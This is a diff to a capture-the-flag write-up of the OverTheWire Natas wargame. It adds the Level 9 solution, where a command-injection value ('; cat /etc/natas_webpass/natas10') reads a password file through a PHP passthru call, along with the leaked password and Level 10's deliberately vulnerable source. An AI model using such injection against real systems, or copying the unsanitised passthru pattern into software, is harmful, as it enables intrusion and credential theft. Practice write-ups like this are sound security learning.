@@ -247,7 +247,7 @@ Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 **Flag:** `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
 
-# Level 8
+# Level 9
 http://overthewire.org/wargames/natas/natas9.html
 
 ```
@@ -273,5 +273,50 @@ if($key != "") {
 ```
 
 [passthru](https://www.php.net/manual/en/function.passthru.php) — Execute an external program and display raw output
+
+Eval Injection - https://www.owasp.org/index.php/Direct_Dynamic_Code_Evaluation_('Eval_Injection')#Example_5
+
+```
+; cat /etc/natas_webpass/natas10
+```
+```
+Output: 
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+African
+Africans
+Allah
+...
+```
+
+**Flag:** `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
+
+# Level 10
+http://overthewire.org/wargames/natas/natas10.html
+
+```
+Username: natas10
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+URL:      http://natas10.natas.labs.overthewire.org
+```
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
 
 **Flag:** ``
